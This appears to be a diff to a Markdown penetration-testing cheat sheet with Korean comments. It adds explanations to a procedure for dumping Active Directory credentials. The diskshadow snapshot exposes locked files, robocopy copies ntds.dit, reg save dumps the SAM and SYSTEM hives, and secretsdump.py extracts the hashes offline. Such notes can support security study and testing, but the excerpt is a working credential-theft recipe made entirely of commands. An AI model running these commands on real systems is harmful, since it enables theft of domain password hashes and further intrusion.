@@ -541,8 +541,10 @@ create
 expose %viper% x:
 ```
 ```powershell
+# C드라이브 스냅샷 생성 및 X드라이브로 마운트 - 잠금파일 접근 가능해짐.
 diskshadow /s vss.dsh
 
+# 데이터 복사
 robocopy /b x:\windows\ntds . ntds.dit
 
 reg save HKLM\SAM SAM
@@ -550,7 +552,7 @@ reg save HKLM\SAM SAM
 reg save HKLM\SYSTEM SYSTEM
 ```
 ```bash
-secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
+secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
 ```
  
 </details>
